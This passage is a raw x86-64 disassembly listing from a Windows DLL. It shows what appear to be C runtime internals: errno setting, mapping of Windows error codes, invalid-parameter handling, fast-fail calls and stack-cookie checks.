   180005a37:	48 8d 49 01          	lea    0x1(%rcx),%rcx
   180005a3b:	84 c0                	test   %al,%al
   180005a3d:	74 28                	je     0x180005a67
   180005a3f:	48 83 ea 01          	sub    $0x1,%rdx
   180005a43:	75 eb                	jne    0x180005a30
   180005a45:	48 85 d2             	test   %rdx,%rdx
   180005a48:	75 1d                	jne    0x180005a67
   180005a4a:	41 88 11             	mov    %dl,(%r9)
   180005a4d:	e8 a2 06 00 00       	call   0x1800060f4
   180005a52:	c7 00 22 00 00 00    	movl   $0x22,(%rax)
   180005a58:	e8 ef 04 00 00       	call   0x180005f4c
   180005a5d:	b8 22 00 00 00       	mov    $0x22,%eax
   180005a62:	48 83 c4 28          	add    $0x28,%rsp
   180005a66:	c3                   	ret
   180005a67:	33 c0                	xor    %eax,%eax
   180005a69:	48 83 c4 28          	add    $0x28,%rsp
   180005a6d:	c3                   	ret
   180005a6e:	cc                   	int3
   180005a6f:	cc                   	int3
   180005a70:	48 83 ec 28          	sub    $0x28,%rsp
   180005a74:	e8 db 35 00 00       	call   0x180009054
   180005a79:	48 85 c0             	test   %rax,%rax
   180005a7c:	74 0a                	je     0x180005a88
   180005a7e:	b9 16 00 00 00       	mov    $0x16,%ecx
   180005a83:	e8 1c 36 00 00       	call   0x1800090a4
   180005a88:	f6 05 f1 45 01 00 02 	testb  $0x2,0x145f1(%rip)        # 0x18001a080
   180005a8f:	74 2a                	je     0x180005abb
   180005a91:	b9 17 00 00 00       	mov    $0x17,%ecx
   180005a96:	ff 15 7c 96 00 00    	call   *0x967c(%rip)        # 0x18000f118
   180005a9c:	85 c0                	test   %eax,%eax
   180005a9e:	74 07                	je     0x180005aa7
   180005aa0:	b9 07 00 00 00       	mov    $0x7,%ecx
   180005aa5:	cd 29                	int    $0x29
   180005aa7:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   180005aad:	ba 15 00 00 40       	mov    $0x40000015,%edx
   180005ab2:	41 8d 48 02          	lea    0x2(%r8),%ecx
   180005ab6:	e8 c5 01 00 00       	call   0x180005c80
   180005abb:	b9 03 00 00 00       	mov    $0x3,%ecx
   180005ac0:	e8 77 f5 ff ff       	call   0x18000503c
   180005ac5:	cc                   	int3
   180005ac6:	cc                   	int3
   180005ac7:	cc                   	int3
   180005ac8:	cc                   	int3
   180005ac9:	cc                   	int3
   180005aca:	cc                   	int3
   180005acb:	cc                   	int3
   180005acc:	cc                   	int3
   180005acd:	cc                   	int3
   180005ace:	cc                   	int3
   180005acf:	cc                   	int3
   180005ad0:	40 57                	rex push %rdi
   180005ad2:	48 83 ec 20          	sub    $0x20,%rsp
   180005ad6:	48 83 39 00          	cmpq   $0x0,(%rcx)
   180005ada:	48 8b f9             	mov    %rcx,%rdi
   180005add:	75 49                	jne    0x180005b28
   180005adf:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   180005ae4:	ff 15 86 95 00 00    	call   *0x9586(%rip)        # 0x18000f070
   180005aea:	80 7f 10 00          	cmpb   $0x0,0x10(%rdi)
   180005aee:	89 44 24 30          	mov    %eax,0x30(%rsp)
   180005af2:	75 0c                	jne    0x180005b00
   180005af4:	33 d2                	xor    %edx,%edx
   180005af6:	c6 47 10 01          	movb   $0x1,0x10(%rdi)
   180005afa:	48 89 57 08          	mov    %rdx,0x8(%rdi)
   180005afe:	eb 04                	jmp    0x180005b04
   180005b00:	48 8b 57 08          	mov    0x8(%rdi),%rdx
   180005b04:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   180005b09:	e8 7a 0b 00 00       	call   0x180006688
   180005b0e:	8b 4c 24 30          	mov    0x30(%rsp),%ecx
   180005b12:	48 8b d8             	mov    %rax,%rbx
   180005b15:	48 89 07             	mov    %rax,(%rdi)
   180005b18:	ff 15 5a 95 00 00    	call   *0x955a(%rip)        # 0x18000f078
   180005b1e:	48 85 db             	test   %rbx,%rbx
   180005b21:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   180005b26:	74 09                	je     0x180005b31
   180005b28:	48 8b 07             	mov    (%rdi),%rax
   180005b2b:	48 83 c4 20          	add    $0x20,%rsp
   180005b2f:	5f                   	pop    %rdi
   180005b30:	c3                   	ret
   180005b31:	e8 3a ff ff ff       	call   0x180005a70
   180005b36:	cc                   	int3
   180005b37:	cc                   	int3
   180005b38:	cc                   	int3
   180005b39:	cc                   	int3
   180005b3a:	cc                   	int3
   180005b3b:	cc                   	int3
   180005b3c:	cc                   	int3
   180005b3d:	cc                   	int3
   180005b3e:	cc                   	int3
   180005b3f:	cc                   	int3
   180005b40:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180005b45:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   180005b4a:	57                   	push   %rdi
   180005b4b:	48 83 ec 20          	sub    $0x20,%rsp
   180005b4f:	48 8b f9             	mov    %rcx,%rdi
   180005b52:	e8 79 ff ff ff       	call   0x180005ad0
   180005b57:	48 8d 57 18          	lea    0x18(%rdi),%rdx
   180005b5b:	48 8b c8             	mov    %rax,%rcx
   180005b5e:	48 8b f0             	mov    %rax,%rsi
   180005b61:	4c 8b 80 90 00 00 00 	mov    0x90(%rax),%r8
   180005b68:	4c 89 02             	mov    %r8,(%rdx)
   180005b6b:	4c 8b 80 88 00 00 00 	mov    0x88(%rax),%r8
   180005b72:	4c 89 47 20          	mov    %r8,0x20(%rdi)
   180005b76:	4c 8b 47 08          	mov    0x8(%rdi),%r8
   180005b7a:	e8 01 0c 00 00       	call   0x180006780
   180005b7f:	4c 8b 47 08          	mov    0x8(%rdi),%r8
   180005b83:	48 8d 57 20          	lea    0x20(%rdi),%rdx
   180005b87:	48 8b ce             	mov    %rsi,%rcx
   180005b8a:	e8 5d 0c 00 00       	call   0x1800067ec
   180005b8f:	8b 86 a8 03 00 00    	mov    0x3a8(%rsi),%eax
   180005b95:	a8 02                	test   $0x2,%al
   180005b97:	75 0d                	jne    0x180005ba6
   180005b99:	83 c8 02             	or     $0x2,%eax
   180005b9c:	89 86 a8 03 00 00    	mov    %eax,0x3a8(%rsi)
   180005ba2:	c6 47 28 02          	movb   $0x2,0x28(%rdi)
   180005ba6:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180005bab:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   180005bb0:	48 83 c4 20          	add    $0x20,%rsp
   180005bb4:	5f                   	pop    %rdi
   180005bb5:	c3                   	ret
   180005bb6:	cc                   	int3
   180005bb7:	cc                   	int3
   180005bb8:	cc                   	int3
   180005bb9:	cc                   	int3
   180005bba:	cc                   	int3
   180005bbb:	cc                   	int3
   180005bbc:	cc                   	int3
   180005bbd:	cc                   	int3
   180005bbe:	cc                   	int3
   180005bbf:	cc                   	int3
   180005bc0:	e9 2b 0e 00 00       	jmp    0x1800069f0
   180005bc5:	cc                   	int3
   180005bc6:	cc                   	int3
   180005bc7:	cc                   	int3
   180005bc8:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   180005bcd:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   180005bd2:	57                   	push   %rdi
   180005bd3:	48 83 ec 20          	sub    $0x20,%rsp
   180005bd7:	48 8b 31             	mov    (%rcx),%rsi
   180005bda:	33 ff                	xor    %edi,%edi
   180005bdc:	48 8b d9             	mov    %rcx,%rbx
   180005bdf:	48 85 f6             	test   %rsi,%rsi
   180005be2:	75 3b                	jne    0x180005c1f
   180005be4:	ff 15 86 94 00 00    	call   *0x9486(%rip)        # 0x18000f070
   180005bea:	89 44 24 30          	mov    %eax,0x30(%rsp)
   180005bee:	40 38 7b 10          	cmp    %dil,0x10(%rbx)
   180005bf2:	75 0a                	jne    0x180005bfe
   180005bf4:	48 89 7b 08          	mov    %rdi,0x8(%rbx)
   180005bf8:	c6 43 10 01          	movb   $0x1,0x10(%rbx)
   180005bfc:	eb 04                	jmp    0x180005c02
   180005bfe:	48 8b 7b 08          	mov    0x8(%rbx),%rdi
   180005c02:	48 8b d7             	mov    %rdi,%rdx
   180005c05:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   180005c0a:	e8 79 0a 00 00       	call   0x180006688
   180005c0f:	8b 4c 24 30          	mov    0x30(%rsp),%ecx
   180005c13:	48 8b f0             	mov    %rax,%rsi
   180005c16:	48 89 03             	mov    %rax,(%rbx)
   180005c19:	ff 15 59 94 00 00    	call   *0x9459(%rip)        # 0x18000f078
   180005c1f:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   180005c24:	48 8b c6             	mov    %rsi,%rax
   180005c27:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   180005c2c:	48 83 c4 20          	add    $0x20,%rsp
   180005c30:	5f                   	pop    %rdi
   180005c31:	c3                   	ret
   180005c32:	cc                   	int3
   180005c33:	cc                   	int3
   180005c34:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180005c39:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   180005c3e:	57                   	push   %rdi
   180005c3f:	48 83 ec 20          	sub    $0x20,%rsp
   180005c43:	33 db                	xor    %ebx,%ebx
   180005c45:	48 8b fa             	mov    %rdx,%rdi
   180005c48:	48 8b f1             	mov    %rcx,%rsi
   180005c4b:	38 5a 10             	cmp    %bl,0x10(%rdx)
   180005c4e:	75 18                	jne    0x180005c68
   180005c50:	ff 15 1a 94 00 00    	call   *0x941a(%rip)        # 0x18000f070
   180005c56:	8b c8                	mov    %eax,%ecx
   180005c58:	48 89 5f 08          	mov    %rbx,0x8(%rdi)
   180005c5c:	c6 47 10 01          	movb   $0x1,0x10(%rdi)
   180005c60:	ff 15 12 94 00 00    	call   *0x9412(%rip)        # 0x18000f078
   180005c66:	eb 04                	jmp    0x180005c6c
   180005c68:	48 8b 5a 08          	mov    0x8(%rdx),%rbx
   180005c6c:	48 8d 04 de          	lea    (%rsi,%rbx,8),%rax
   180005c70:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180005c75:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   180005c7a:	48 83 c4 20          	add    $0x20,%rsp
   180005c7e:	5f                   	pop    %rdi
   180005c7f:	c3                   	ret
   180005c80:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   180005c85:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   180005c8a:	55                   	push   %rbp
   180005c8b:	57                   	push   %rdi
   180005c8c:	41 56                	push   %r14
   180005c8e:	48 8d ac 24 10 fb ff 	lea    -0x4f0(%rsp),%rbp
   180005c95:	ff 
   180005c96:	48 81 ec f0 05 00 00 	sub    $0x5f0,%rsp
   180005c9d:	48 8b 05 5c 43 01 00 	mov    0x1435c(%rip),%rax        # 0x18001a000
   180005ca4:	48 33 c4             	xor    %rsp,%rax
   180005ca7:	48 89 85 e0 04 00 00 	mov    %rax,0x4e0(%rbp)
   180005cae:	41 8b f8             	mov    %r8d,%edi
   180005cb1:	8b f2                	mov    %edx,%esi
   180005cb3:	8b d9                	mov    %ecx,%ebx
   180005cb5:	83 f9 ff             	cmp    $0xffffffff,%ecx
   180005cb8:	74 05                	je     0x180005cbf
   180005cba:	e8 41 be ff ff       	call   0x180001b00
   180005cbf:	33 d2                	xor    %edx,%edx
   180005cc1:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   180005cc6:	41 b8 98 00 00 00    	mov    $0x98,%r8d
   180005ccc:	e8 df 7c 00 00       	call   0x18000d9b0
   180005cd1:	33 d2                	xor    %edx,%edx
   180005cd3:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   180005cd7:	41 b8 d0 04 00 00    	mov    $0x4d0,%r8d
   180005cdd:	e8 ce 7c 00 00       	call   0x18000d9b0
   180005ce2:	48 83 64 24 48 00    	andq   $0x0,0x48(%rsp)
   180005ce8:	48 8d 44 24 70       	lea    0x70(%rsp),%rax
   180005ced:	48 83 64 24 40 00    	andq   $0x0,0x40(%rsp)
   180005cf3:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   180005cf7:	48 83 64 24 50 00    	andq   $0x0,0x50(%rsp)
   180005cfd:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   180005d02:	48 8d 45 10          	lea    0x10(%rbp),%rax
   180005d06:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   180005d0b:	ff 15 0f 94 00 00    	call   *0x940f(%rip)        # 0x18000f120
   180005d11:	4c 8b b5 08 01 00 00 	mov    0x108(%rbp),%r14
   180005d18:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   180005d1d:	49 8b ce             	mov    %r14,%rcx
   180005d20:	45 33 c0             	xor    %r8d,%r8d
   180005d23:	ff 15 97 93 00 00    	call   *0x9397(%rip)        # 0x18000f0c0
   180005d29:	48 85 c0             	test   %rax,%rax
   180005d2c:	74 36                	je     0x180005d64
   180005d2e:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   180005d34:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   180005d39:	48 8b 54 24 40       	mov    0x40(%rsp),%rdx
   180005d3e:	4c 8b c8             	mov    %rax,%r9
   180005d41:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   180005d46:	4d 8b c6             	mov    %r14,%r8
   180005d49:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   180005d4e:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   180005d53:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   180005d57:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   180005d5c:	33 c9                	xor    %ecx,%ecx
   180005d5e:	ff 15 c4 93 00 00    	call   *0x93c4(%rip)        # 0x18000f128
   180005d64:	48 8b 85 08 05 00 00 	mov    0x508(%rbp),%rax
   180005d6b:	48 89 85 08 01 00 00 	mov    %rax,0x108(%rbp)
   180005d72:	48 8d 85 08 05 00 00 	lea    0x508(%rbp),%rax
   180005d79:	48 83 c0 08          	add    $0x8,%rax
   180005d7d:	89 74 24 70          	mov    %esi,0x70(%rsp)
   180005d81:	48 89 85 a8 00 00 00 	mov    %rax,0xa8(%rbp)
   180005d88:	48 8b 85 08 05 00 00 	mov    0x508(%rbp),%rax
   180005d8f:	48 89 45 80          	mov    %rax,-0x80(%rbp)
   180005d93:	89 7c 24 74          	mov    %edi,0x74(%rsp)
   180005d97:	ff 15 93 93 00 00    	call   *0x9393(%rip)        # 0x18000f130
   180005d9d:	33 c9                	xor    %ecx,%ecx
   180005d9f:	8b f8                	mov    %eax,%edi
   180005da1:	ff 15 a1 92 00 00    	call   *0x92a1(%rip)        # 0x18000f048
   180005da7:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   180005dac:	ff 15 86 93 00 00    	call   *0x9386(%rip)        # 0x18000f138
   180005db2:	85 c0                	test   %eax,%eax
   180005db4:	75 10                	jne    0x180005dc6
   180005db6:	85 ff                	test   %edi,%edi
   180005db8:	75 0c                	jne    0x180005dc6
   180005dba:	83 fb ff             	cmp    $0xffffffff,%ebx
   180005dbd:	74 07                	je     0x180005dc6
   180005dbf:	8b cb                	mov    %ebx,%ecx
   180005dc1:	e8 3a bd ff ff       	call   0x180001b00
   180005dc6:	48 8b 8d e0 04 00 00 	mov    0x4e0(%rbp),%rcx
   180005dcd:	48 33 cc             	xor    %rsp,%rcx
   180005dd0:	e8 fb b4 ff ff       	call   0x1800012d0
   180005dd5:	4c 8d 9c 24 f0 05 00 	lea    0x5f0(%rsp),%r11
   180005ddc:	00 
   180005ddd:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   180005de1:	49 8b 73 30          	mov    0x30(%r11),%rsi
   180005de5:	49 8b e3             	mov    %r11,%rsp
   180005de8:	41 5e                	pop    %r14
   180005dea:	5f                   	pop    %rdi
   180005deb:	5d                   	pop    %rbp
   180005dec:	c3                   	ret
   180005ded:	cc                   	int3
   180005dee:	cc                   	int3
   180005def:	cc                   	int3
   180005df0:	48 89 0d 51 4f 01 00 	mov    %rcx,0x14f51(%rip)        # 0x18001ad48
   180005df7:	c3                   	ret
   180005df8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180005dfd:	55                   	push   %rbp
   180005dfe:	48 8b ec             	mov    %rsp,%rbp
   180005e01:	48 83 ec 70          	sub    $0x70,%rsp
   180005e05:	48 83 65 c0 00       	andq   $0x0,-0x40(%rbp)
   180005e0a:	83 3d 43 4f 01 00 00 	cmpl   $0x0,0x14f43(%rip)        # 0x18001ad54
   180005e11:	c6 45 d0 00          	movb   $0x0,-0x30(%rbp)
   180005e15:	c6 45 e8 00          	movb   $0x0,-0x18(%rbp)
   180005e19:	c6 45 f0 00          	movb   $0x0,-0x10(%rbp)
   180005e1d:	c6 45 f8 00          	movb   $0x0,-0x8(%rbp)
   180005e21:	75 10                	jne    0x180005e33
   180005e23:	0f 10 05 ce 43 01 00 	movups 0x143ce(%rip),%xmm0        # 0x18001a1f8
   180005e2a:	c6 45 e8 01          	movb   $0x1,-0x18(%rbp)
   180005e2e:	f3 0f 7f 45 d8       	movdqu %xmm0,-0x28(%rbp)
   180005e33:	48 8d 45 c0          	lea    -0x40(%rbp),%rax
   180005e37:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   180005e3c:	48 8b 45 30          	mov    0x30(%rbp),%rax
   180005e40:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180005e45:	e8 4a 00 00 00       	call   0x180005e94
   180005e4a:	80 7d e8 02          	cmpb   $0x2,-0x18(%rbp)
   180005e4e:	75 0b                	jne    0x180005e5b
   180005e50:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
   180005e54:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   180005e5b:	80 7d f0 00          	cmpb   $0x0,-0x10(%rbp)
   180005e5f:	74 0f                	je     0x180005e70
   180005e61:	8b 5d ec             	mov    -0x14(%rbp),%ebx
   180005e64:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   180005e68:	e8 63 fc ff ff       	call   0x180005ad0
   180005e6d:	89 58 20             	mov    %ebx,0x20(%rax)
   180005e70:	80 7d f8 00          	cmpb   $0x0,-0x8(%rbp)
   180005e74:	74 0f                	je     0x180005e85
   180005e76:	8b 5d f4             	mov    -0xc(%rbp),%ebx
   180005e79:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   180005e7d:	e8 4e fc ff ff       	call   0x180005ad0
   180005e82:	89 58 24             	mov    %ebx,0x24(%rax)
   180005e85:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   180005e8c:	00 
   180005e8d:	48 83 c4 70          	add    $0x70,%rsp
   180005e91:	5d                   	pop    %rbp
   180005e92:	c3                   	ret
   180005e93:	cc                   	int3
   180005e94:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180005e99:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   180005e9e:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   180005ea3:	57                   	push   %rdi
   180005ea4:	48 83 ec 30          	sub    $0x30,%rsp
   180005ea8:	48 8b e9             	mov    %rcx,%rbp
   180005eab:	41 8b d9             	mov    %r9d,%ebx
   180005eae:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   180005eb3:	49 8b f8             	mov    %r8,%rdi
   180005eb6:	48 8b f2             	mov    %rdx,%rsi
   180005eb9:	e8 0a fd ff ff       	call   0x180005bc8
   180005ebe:	48 85 c0             	test   %rax,%rax
   180005ec1:	74 3c                	je     0x180005eff
   180005ec3:	48 8b 80 b8 03 00 00 	mov    0x3b8(%rax),%rax
   180005eca:	48 85 c0             	test   %rax,%rax
   180005ecd:	74 30                	je     0x180005eff
   180005ecf:	44 8b cb             	mov    %ebx,%r9d
   180005ed2:	4c 8b c7             	mov    %rdi,%r8
   180005ed5:	48 8b d6             	mov    %rsi,%rdx
   180005ed8:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   180005edd:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   180005ee2:	48 8b cd             	mov    %rbp,%rcx
   180005ee5:	e8 46 73 00 00       	call   0x18000d230
   180005eea:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   180005eef:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   180005ef4:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   180005ef9:	48 83 c4 30          	add    $0x30,%rsp
   180005efd:	5f                   	pop    %rdi
   180005efe:	c3                   	ret
   180005eff:	48 8b 54 24 68       	mov    0x68(%rsp),%rdx
   180005f04:	48 8d 0d 3d 4e 01 00 	lea    0x14e3d(%rip),%rcx        # 0x18001ad48
   180005f0b:	e8 24 fd ff ff       	call   0x180005c34
   180005f10:	44 8b cb             	mov    %ebx,%r9d
   180005f13:	4c 8b c7             	mov    %rdi,%r8
   180005f16:	48 8b d6             	mov    %rsi,%rdx
   180005f19:	4c 8b 10             	mov    (%rax),%r10
   180005f1c:	48 8b 05 dd 40 01 00 	mov    0x140dd(%rip),%rax        # 0x18001a000
   180005f23:	4c 33 d0             	xor    %rax,%r10
   180005f26:	8b c8                	mov    %eax,%ecx
   180005f28:	83 e1 3f             	and    $0x3f,%ecx
   180005f2b:	49 d3 ca             	ror    %cl,%r10
   180005f2e:	4d 85 d2             	test   %r10,%r10
   180005f31:	74 05                	je     0x180005f38
   180005f33:	49 8b c2             	mov    %r10,%rax
   180005f36:	eb a0                	jmp    0x180005ed8
   180005f38:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   180005f3d:	48 8b cd             	mov    %rbp,%rcx
   180005f40:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180005f45:	e8 22 00 00 00       	call   0x180005f6c
   180005f4a:	cc                   	int3
   180005f4b:	cc                   	int3
   180005f4c:	48 83 ec 38          	sub    $0x38,%rsp
   180005f50:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   180005f56:	45 33 c9             	xor    %r9d,%r9d
   180005f59:	45 33 c0             	xor    %r8d,%r8d
   180005f5c:	33 d2                	xor    %edx,%edx
   180005f5e:	33 c9                	xor    %ecx,%ecx
   180005f60:	e8 93 fe ff ff       	call   0x180005df8
   180005f65:	48 83 c4 38          	add    $0x38,%rsp
   180005f69:	c3                   	ret
   180005f6a:	cc                   	int3
   180005f6b:	cc                   	int3
   180005f6c:	48 83 ec 28          	sub    $0x28,%rsp
   180005f70:	b9 17 00 00 00       	mov    $0x17,%ecx
   180005f75:	ff 15 9d 91 00 00    	call   *0x919d(%rip)        # 0x18000f118
   180005f7b:	85 c0                	test   %eax,%eax
   180005f7d:	74 07                	je     0x180005f86
   180005f7f:	b9 05 00 00 00       	mov    $0x5,%ecx
   180005f84:	cd 29                	int    $0x29
   180005f86:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   180005f8c:	ba 17 04 00 c0       	mov    $0xc0000417,%edx
   180005f91:	41 8d 48 01          	lea    0x1(%r8),%ecx
   180005f95:	e8 e6 fc ff ff       	call   0x180005c80
   180005f9a:	ff 15 40 91 00 00    	call   *0x9140(%rip)        # 0x18000f0e0
   180005fa0:	48 8b c8             	mov    %rax,%rcx
   180005fa3:	ba 17 04 00 c0       	mov    $0xc0000417,%edx
   180005fa8:	48 83 c4 28          	add    $0x28,%rsp
   180005fac:	48 ff 25 3d 91 00 00 	rex.W jmp *0x913d(%rip)        # 0x18000f0f0
   180005fb3:	cc                   	int3
   180005fb4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180005fb9:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   180005fbe:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   180005fc3:	8b d1                	mov    %ecx,%edx
   180005fc5:	83 f9 01             	cmp    $0x1,%ecx
   180005fc8:	72 6d                	jb     0x180006037
   180005fca:	83 f9 0d             	cmp    $0xd,%ecx
   180005fcd:	77 14                	ja     0x180005fe3
   180005fcf:	8d 41 ff             	lea    -0x1(%rcx),%eax
   180005fd2:	4c 8d 0d d7 a4 00 00 	lea    0xa4d7(%rip),%r9        # 0x1800104b0
   180005fd9:	41 8b 44 c1 04       	mov    0x4(%r9,%rax,8),%eax
   180005fde:	e9 90 00 00 00       	jmp    0x180006073
   180005fe3:	81 fa 18 07 00 00    	cmp    $0x718,%edx
   180005fe9:	77 4c                	ja     0x180006037
   180005feb:	b9 2d 00 00 00       	mov    $0x2d,%ecx
   180005ff0:	4c 8d 0d b9 a4 00 00 	lea    0xa4b9(%rip),%r9        # 0x1800104b0
   180005ff7:	33 f6                	xor    %esi,%esi
   180005ff9:	44 8b d6             	mov    %esi,%r10d
   180005ffc:	8d 79 ff             	lea    -0x1(%rcx),%edi
   180005fff:	4c 8b c1             	mov    %rcx,%r8
   180006002:	49 d1 e8             	shr    $1,%r8
   180006005:	74 3f                	je     0x180006046
   180006007:	f6 c1 01             	test   $0x1,%cl
   18000600a:	49 8d 48 ff          	lea    -0x1(%r8),%rcx
   18000600e:	49 0f 45 c8          	cmovne %r8,%rcx
   180006012:	4e 8d 1c 11          	lea    (%rcx,%r10,1),%r11
   180006016:	4b 8d 04 d9          	lea    (%r9,%r11,8),%rax
   18000601a:	3b 10                	cmp    (%rax),%edx
   18000601c:	74 37                	je     0x180006055
   18000601e:	72 07                	jb     0x180006027
   180006020:	4d 8d 53 01          	lea    0x1(%r11),%r10
   180006024:	49 8b c8             	mov    %r8,%rcx
   180006027:	49 8d 43 ff          	lea    -0x1(%r11),%rax
   18000602b:	48 0f 43 c7          	cmovae %rdi,%rax
   18000602f:	48 8b f8             	mov    %rax,%rdi
   180006032:	4c 3b d0             	cmp    %rax,%r10
   180006035:	76 c8                	jbe    0x180005fff
   180006037:	8d 4a ed             	lea    -0x13(%rdx),%ecx
   18000603a:	83 f9 11             	cmp    $0x11,%ecx
   18000603d:	77 20                	ja     0x18000605f
   18000603f:	b8 0d 00 00 00       	mov    $0xd,%eax
   180006044:	eb 2d                	jmp    0x180006073
   180006046:	48 85 c9             	test   %rcx,%rcx
   180006049:	74 ec                	je     0x180006037
   18000604b:	4b 8d 04 d1          	lea    (%r9,%r10,8),%rax
   18000604f:	3b 10                	cmp    (%rax),%edx
   180006051:	48 0f 45 c6          	cmovne %rsi,%rax
   180006055:	48 85 c0             	test   %rax,%rax
   180006058:	74 dd                	je     0x180006037
   18000605a:	8b 40 04             	mov    0x4(%rax),%eax
   18000605d:	eb 14                	jmp    0x180006073
   18000605f:	b8 16 00 00 00       	mov    $0x16,%eax
   180006064:	8d 8a 44 ff ff ff    	lea    -0xbc(%rdx),%ecx
   18000606a:	83 f9 0e             	cmp    $0xe,%ecx
   18000606d:	8d 50 f2             	lea    -0xe(%rax),%edx
   180006070:	0f 46 c2             	cmovbe %edx,%eax
   180006073:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   180006078:	48 8b 74 24 10       	mov    0x10(%rsp),%rsi
   18000607d:	48 8b 7c 24 18       	mov    0x18(%rsp),%rdi
   180006082:	c3                   	ret
   180006083:	cc                   	int3
   180006084:	40 53                	rex push %rbx
   180006086:	48 83 ec 20          	sub    $0x20,%rsp
   18000608a:	8b d9                	mov    %ecx,%ebx
   18000608c:	e8 3f 00 00 00       	call   0x1800060d0
   180006091:	8b cb                	mov    %ebx,%ecx
   180006093:	89 18                	mov    %ebx,(%rax)
   180006095:	e8 1a ff ff ff       	call   0x180005fb4
   18000609a:	8b d8                	mov    %eax,%ebx
   18000609c:	e8 53 00 00 00       	call   0x1800060f4
   1800060a1:	89 18                	mov    %ebx,(%rax)
   1800060a3:	48 83 c4 20          	add    $0x20,%rsp
   1800060a7:	5b                   	pop    %rbx
   1800060a8:	c3                   	ret
   1800060a9:	cc                   	int3
   1800060aa:	cc                   	int3
   1800060ab:	cc                   	int3
   1800060ac:	40 53                	rex push %rbx
   1800060ae:	48 83 ec 20          	sub    $0x20,%rsp
   1800060b2:	48 8b da             	mov    %rdx,%rbx
   1800060b5:	c6 42 38 01          	movb   $0x1,0x38(%rdx)
   1800060b9:	89 4a 34             	mov    %ecx,0x34(%rdx)
   1800060bc:	e8 f3 fe ff ff       	call   0x180005fb4
   1800060c1:	89 43 2c             	mov    %eax,0x2c(%rbx)
   1800060c4:	c6 43 30 01          	movb   $0x1,0x30(%rbx)
   1800060c8:	48 83 c4 20          	add    $0x20,%rsp
   1800060cc:	5b                   	pop    %rbx
   1800060cd:	c3                   	ret
   1800060ce:	cc                   	int3
   1800060cf:	cc                   	int3
   1800060d0:	48 83 ec 28          	sub    $0x28,%rsp
   1800060d4:	e8 1f 05 00 00       	call   0x1800065f8
   1800060d9:	48 8b c8             	mov    %rax,%rcx
   1800060dc:	48 8d 15 b1 3f 01 00 	lea    0x13fb1(%rip),%rdx        # 0x18001a094
   1800060e3:	48 83 c0 24          	add    $0x24,%rax
   1800060e7:	48 85 c9             	test   %rcx,%rcx
   1800060ea:	48 0f 44 c2          	cmove  %rdx,%rax
   1800060ee:	48 83 c4 28          	add    $0x28,%rsp
   1800060f2:	c3                   	ret
   1800060f3:	cc                   	int3
   1800060f4:	48 83 ec 28          	sub    $0x28,%rsp
   1800060f8:	e8 fb 04 00 00       	call   0x1800065f8
   1800060fd:	48 8b c8             	mov    %rax,%rcx
   180006100:	48 8d 15 89 3f 01 00 	lea    0x13f89(%rip),%rdx        # 0x18001a090
   180006107:	48 83 c0 20          	add    $0x20,%rax
   18000610b:	48 85 c9             	test   %rcx,%rcx
   18000610e:	48 0f 44 c2          	cmove  %rdx,%rax
   180006112:	48 83 c4 28          	add    $0x28,%rsp
   180006116:	c3                   	ret
   180006117:	cc                   	int3
   180006118:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000611d:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   180006122:	57                   	push   %rdi
